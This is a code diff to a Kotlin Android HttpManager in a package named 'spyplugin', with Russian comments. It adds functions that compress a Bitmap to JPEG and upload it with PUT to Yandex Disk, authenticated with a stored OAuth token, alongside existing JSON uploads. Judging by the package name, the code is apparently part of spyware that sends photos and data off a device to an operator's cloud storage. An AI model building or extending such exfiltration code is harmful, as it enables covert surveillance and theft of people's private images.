@@ -1,5 +1,6 @@
 package com.example.spyplugin
 
+import android.graphics.Bitmap
 import android.util.Log
 import com.google.gson.GsonBuilder
 import kotlinx.coroutines.Dispatchers
@@ -88,6 +89,48 @@ object HttpManager {
         }
     }
 
+    private fun getYandexUploadUrl(diskPath: String): String? {
+        var connection: HttpURLConnection? = null
+        try {
+            val diskPath = URLEncoder.encode(diskPath, "UTF-8")
+
+            val urlString = "$YANDEX_DISK_API?path=$diskPath&overwrite=true"
+            val url = URL(urlString)
+
+            connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "GET"
+            connection.setRequestProperty("Authorization", "OAuth $ACCESS_TOKEN")
+            connection.connectTimeout = 30000
+            connection.readTimeout = 30000
+
+            val responseCode = connection.responseCode
+
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                val reader = BufferedReader(InputStreamReader(connection.inputStream))
+                val response = reader.readText()
+                reader.close()
+
+                // Извлечение href
+                val jsonResponse = gson.fromJson(response, Map::class.java)
+                val uploadHref = jsonResponse["href"] as String
+
+                Log.d("YANDEX_DISK", "Ссылка для загрузки получена")
+                return uploadHref
+            } else {
+                val errorReader = BufferedReader(InputStreamReader(connection.errorStream))
+                val errorResponse = errorReader.readText()
+                errorReader.close()
+                Log.e("YANDEX_DISK", "Ошибка получения URL для загрузки. Код: $responseCode, Ответ: $errorResponse")
+                return null
+            }
+        } catch (e: Exception) {
+            Log.e("YANDEX_DISK", "Ошибка при запросе URL для загрузки: ${e.message}")
+            return null
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
     private fun uploadJsonToYandex(uploadUrl: String, jsonString: String): Boolean {
         var connection: HttpURLConnection? = null
         try {
@@ -121,6 +164,57 @@ object HttpManager {
         } catch (e: Exception) {
             Log.e("YANDEX_DISK", "Ошибка при загрузке файла: ${e.message}")
             return false
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
+    fun uploadPhoto(bitmap: Bitmap, diskPath: String): Boolean {
+
+        val uploadUrl = getYandexUploadUrl(diskPath) ?: return false
+
+        Log.d("HttpManager", uploadUrl)
+
+        val stream = java.io.ByteArrayOutputStream()
+
+        bitmap.compress(
+            Bitmap.CompressFormat.JPEG,
+            80,
+            stream
+        )
+
+        val bytes = stream.toByteArray()
+
+        return uploadBinary(uploadUrl, bytes)
+    }
+
+    private fun uploadBinary(uploadUrl: String, data: ByteArray): Boolean {
+
+        var connection: HttpURLConnection? = null
+
+        return try {
+
+            val url = URL(uploadUrl)
+            connection = url.openConnection() as HttpURLConnection
+
+            connection.requestMethod = "PUT"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/octet-stream")
+
+            val os = connection.outputStream
+            os.write(data)
+            os.flush()
+            os.close()
+
+            val responseCode = connection.responseCode
+
+            responseCode == 201 || responseCode == 200
+
+        } catch (e: Exception) {
+
+            Log.e("YANDEX_DISK", "Ошибка загрузки файла: ${e.message}")
+            false
+
         } finally {
             connection?.disconnect()
         }
